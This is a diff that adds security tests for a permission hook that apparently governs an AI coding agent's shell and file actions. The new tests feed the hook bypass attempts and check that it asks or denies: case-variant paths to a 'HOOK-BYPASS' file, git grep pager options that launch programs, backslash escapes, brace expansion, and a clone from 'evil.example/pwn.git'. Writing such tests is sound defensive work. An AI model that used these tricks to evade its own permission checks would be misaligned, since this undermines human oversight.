@@ -296,6 +296,31 @@ JSON
     [[ "$output" == *"security-sensitive workspace state"* ]]
 }
 
+@test "security: case variants cannot disguise sensitive scratch state" {
+    seed_real_project_config
+    if [[ ! "$WORK/.claude" -ef "$WORK/.CLAUDE" ]]; then
+        ln -s "$WORK/.claude" "$WORK/.CLAUDE" 2>/dev/null || true
+    fi
+    [[ "$WORK/.claude" -ef "$WORK/.CLAUDE" ]] || skip "cannot simulate a case-insensitive project filesystem"
+
+    run_hook_write "Write" "$WORK/.TMP/HOOK-BYPASS/git-commit.bypass"
+
+    [ "$status" -eq 0 ]
+    [[ "$output" == *'"permissionDecision":"ask"'* ]]
+    [[ "$output" == *"security-sensitive workspace state"* ]]
+}
+
+@test "security: the shared Kubernetes guard helper requires approval to edit" {
+    seed_real_project_config
+    mkdir -p "$WORK/scripts"
+
+    run_hook_write "Edit" "$WORK/scripts/ws-k8s-guard.sh"
+
+    [ "$status" -eq 0 ]
+    [[ "$output" == *'"permissionDecision":"ask"'* ]]
+    [[ "$output" == *"security-sensitive workspace state"* ]]
+}
+
 @test "security: a scratch symlink alias to sensitive state still forces an ask" {
     seed_real_project_config
     mkdir -p "$WORK/.tmp"
@@ -371,6 +396,35 @@ JSON
     [[ "$output" == *"Git execution modifier"* ]]
 }
 
+@test "security: git grep short pager option denies before a grep allow" {
+    write_project_hook_rules ""
+    write_project_settings 'Bash(git grep:*)'
+
+    run_hook "git grep -Ovim secret"
+
+    [[ "$output" == *'"permissionDecision":"deny"'* ]]
+    [[ "$output" == *"Git execution modifier"* ]]
+}
+
+@test "security: git grep long pager option denies before a grep allow" {
+    write_project_hook_rules ""
+    write_project_settings 'Bash(git grep:*)'
+
+    run_hook "git grep --open-files-in-pager=less secret"
+
+    [[ "$output" == *'"permissionDecision":"deny"'* ]]
+    [[ "$output" == *"Git execution modifier"* ]]
+}
+
+@test "security: unrelated Git -O option keeps its normal permission" {
+    write_project_hook_rules ""
+    write_project_settings 'Bash(git log:*)'
+
+    run_hook "git log -Oorderfile"
+
+    [[ "$output" == *'"permissionDecision":"allow"'* ]]
+}
+
 @test "security: bats allow cannot traverse from tests into scratch" {
     seed_real_project_config
 
@@ -412,6 +466,23 @@ JSON
     run_hook "ws clone --url https://evil.example/pwn.git --name pwn --add-eco"
 
     [[ "$output" == *'"permissionDecision":"ask"'* ]]
+}
+
+@test "ask: backslash escapes cannot hide an ask-tier option" {
+    seed_real_project_config
+
+    run_hook 'ws clone --url https://evil.example/pwn.git --name pwn --add\-eco'
+
+    [[ "$output" == *'"permissionDecision":"ask"'* ]]
+}
+
+@test "ask: brace expansion cannot synthesize unreviewed command arguments" {
+    seed_real_project_config
+
+    run_hook 'ws clone --url https://evil.example/pwn.git --name pwn --{add-eco,quiet}'
+
+    [[ "$output" == *'"permissionDecision":"ask"'* ]]
+    [[ "$output" == *"Brace expansion"* ]]
 }
 
 # ─── Tier 6: [allow-extras] from hook-rules.local ───────────────────
@@ -1581,6 +1652,21 @@ EOF
     [ "$status" -eq 0 ]
     [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
     [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
+}
+
+@test "powershell: case variants of scratch roots do not use the carve-out" {
+    seed_real_project_config
+    mkdir -p "$WORK/.TMP"
+    if [[ ! "$WORK/.claude" -ef "$WORK/.CLAUDE" ]]; then
+        ln -s "$WORK/.claude" "$WORK/.CLAUDE" 2>/dev/null || true
+    fi
+    [[ "$WORK/.claude" -ef "$WORK/.CLAUDE" ]] || skip "cannot simulate a case-insensitive project filesystem"
+
+    run_hook_ps "Set-Location $WORK/.TMP; ./test.ps1" "" "$WORK"
+
+    [ "$status" -eq 0 ]
+    [[ "$output" == *'"permissionDecision":"deny"'* ]]
+    [[ "$output" != *'"permissionDecision":"allow"'* ]]
 }
 
 @test "powershell: dot segments cannot disguise a scratch-hosted wrapper" {
